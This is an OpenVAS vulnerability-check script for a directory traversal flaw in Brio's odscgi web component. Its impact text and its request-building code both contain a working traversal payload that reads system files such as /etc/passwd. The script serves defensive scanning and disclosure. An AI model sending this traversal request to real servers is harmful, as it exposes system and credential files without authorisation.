###############################################################################
# OpenVAS Vulnerability Test
# $Id: brio_dir_traversal.nasl 13543 2019-02-08 14:43:51Z cfischer $
#
# Brio Unix Directory Traversal
#
# Authors:
# fr0stman <fr0stman@sun-tzu-security.net>
#
# Copyright:
# Copyright (C) 2003 Chris Foster
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

# v. 1.00 (last update 02.09.03)

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.15849");
  script_version("$Revision: 13543 $");
  script_tag(name:"last_modification", value:"$Date: 2019-02-08 15:43:51 +0100 (Fri, 08 Feb 2019) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_name("Brio Unix Directory Traversal");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2003 Chris Foster");
  script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"summary", value:"The Brio web application interface has a directory traversal
  in the component 'odscgi'.");

  script_tag(name:"impact", value:"An attacker may exploit this flaw to read
  arbitrary files on the remote host by submitting a URL like :

  http://www.example.com/ods-cgi/odscgi?HTMLFile=../../../../../../etc/passwd");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective features,
  remove the product or replace the product by another one.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("host_details.inc");
include("misc_func.inc");
include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port( default:80 );

files = traversal_files();
foreach file( keys( files ) ) {

  foreach dir( make_list_unique( "/", cgi_dirs( port:port ) ) ) {
    if( dir == "/" ) dir = "";
    url = dir + "/ods-cgi/odscgi?HTMLFile=../../../../../../../../../../../../../../../" + files[file];
    if( http_vuln_check( port:port, url:url, pattern:file ) ) {
      report = report_vuln_url( port:port, url:url );
      security_message( port:port, data:report );
      exit( 0 );
    }
  }
}

exit( 99 );